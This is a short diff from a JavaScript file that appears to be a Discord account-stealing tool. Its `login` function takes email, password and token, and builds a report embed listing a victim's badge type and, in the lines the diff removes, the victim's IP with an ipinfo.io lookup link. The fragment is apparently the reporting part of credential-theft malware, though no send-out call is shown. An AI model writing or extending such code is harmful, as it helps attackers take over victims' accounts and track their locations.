@@ -693,11 +693,6 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
-            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
-            inline: true,
-          },
-          {
             name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
             value: `${badges}`,
             inline: true,
